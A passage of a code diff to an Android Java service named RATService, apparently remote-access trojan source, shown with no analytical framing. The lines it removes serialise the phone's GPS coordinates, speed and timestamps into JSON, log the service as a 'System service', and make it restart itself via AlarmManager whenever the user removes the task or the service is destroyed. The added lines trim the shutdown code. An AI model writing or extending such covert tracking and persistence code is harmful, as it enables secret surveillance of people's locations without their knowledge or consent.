-                == PackageManager.PERMISSION_GRANTED;
-    }
-    
-    private String createLocationJson(Location location) {
-        try {
-            JSONObject json = new JSONObject();
-            json.put("latitude", location.getLatitude());
-            json.put("longitude", location.getLongitude());
-            json.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : 0);
-            json.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
-            json.put("bearing", location.hasBearing() ? location.getBearing() : 0);
-            json.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
-            json.put("provider", location.getProvider());
-            json.put("time", location.getTime());
-            json.put("timestamp", System.currentTimeMillis());
-            return json.toString();
-        } catch (JSONException e) {
-            return "{\"error\":\"JSON creation error\"}";
-        }
-    }
+    // Keep all your existing handler methods (handleLocationStreamCommand, etc.)
     
     private String getUniqueDeviceId() {
         SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
@@ -1046,30 +320,6 @@ public class RATService extends Service {
         return deviceId;
     }
     
-    private void scheduleRestartWithAlarm() {
-        Intent restartIntent = new Intent(this, RATService.class);
-        PendingIntent pendingIntent = PendingIntent.getService(
-            this, 1, restartIntent, 
-            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
-        
-        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        if (alarmManager != null) {
-            alarmManager.set(
-                AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
-                pendingIntent);
-            Log.d(TAG, "Restart scheduled");
-        }
-    }
-    
-    @Override
-    public void onTaskRemoved(Intent rootIntent) {
-        super.onTaskRemoved(rootIntent);
-        Log.d(TAG, "Task removed - normal operation");
-        scheduleAllJobs();
-        scheduleRestartWithAlarm();
-    }
-    
     @Override
     public IBinder onBind(Intent intent) {
         return binder;
@@ -1077,53 +327,20 @@ public class RATService extends Service {
     
     @Override
     public void onDestroy() {
-        Log.d(TAG, "System service onDestroy");
-        
-        stopLocationTracking();
-        stopHeartbeat();
-        isReconnectScheduled.set(false);
-        
-        if (reconnectSchedulerThread != null) {
-            reconnectSchedulerThread.interrupt();
-        }
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && connectivityManager != null && networkCallback != null) {
-            try {
-                connectivityManager.unregisterNetworkCallback(networkCallback);
-            } catch (Exception e) {
-                Log.e(TAG, "Error unregistering network callback", e);
-            }
-        }
-        
-        if (locationThread != null) {
-            locationThread.quitSafely();
-            try {
-                locationThread.join();
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-        }
+        Log.d(TAG, "Service onDestroy");
         
         isRunning.set(false);
-        AppController.clearConnectionService();
         instance = null;
         
         closeConnection();
         
-        try {
-            if (connectionThread != null) connectionThread.interrupt();
-            if (watchdogThread != null) watchdogThread.interrupt();
-            if (heartbeatThread != null) heartbeatThread.interrupt();
-            if (reconnectSchedulerThread != null) reconnectSchedulerThread.interrupt();
-            if (wakeLock != null && wakeLock.isHeld()) {
-                wakeLock.release();
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
+        if (executor != null) {
+            executor.shutdownNow();
         }
         
-        scheduleAllJobs();
-        scheduleRestartWithAlarm();
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
         
         super.onDestroy();
     }
